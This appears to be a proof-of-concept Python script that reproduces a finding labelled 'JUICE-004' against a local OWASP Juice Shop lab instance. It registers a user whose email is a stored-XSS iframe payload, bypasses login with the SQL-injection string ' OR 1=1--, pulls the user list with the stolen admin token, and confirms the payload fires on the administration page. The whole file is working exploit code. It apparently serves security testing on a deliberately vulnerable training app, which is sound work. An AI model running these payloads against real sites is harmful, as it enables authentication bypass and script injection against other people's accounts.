import sys
import requests

BASE = "http://localhost:3000"
PAYLOAD = '<iframe src="javascript:alert(`xss`)">'

def main() -> int:
    reg = requests.post(
        f"{BASE}/api/Users",
        json={"email": PAYLOAD, "password": "xss12345"},
        timeout=15,
    )
    print(f"POST /api/Users  (email=<iframe payload>)  ->  HTTP {reg.status_code}")
    
    login = requests.post(
        f"{BASE}/rest/user/login",
        json={"email": "' OR 1=1--", "password": "x"},
        timeout=15,
    )
    token = login.json()["authentication"]["token"]
    users = requests.get(
        f"{BASE}/api/Users",
        headers={"Authorization": f"Bearer {token}"},
        timeout=15,
    ).json().get("data", [])

    stored_raw = any(isinstance(u.get("email"), str) and "<iframe" in u["email"] for u in users)
    if stored_raw:
        print("Payload stored RAW in a user record.")
        print(f"Now open {BASE}/#/administration as admin - the alert('xss') fires on load.")
        print("JUICE-004 reproduced: persisted XSS via user email on the admin page.")
        return 0

    print("Payload was sanitized (empty email stored).")
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
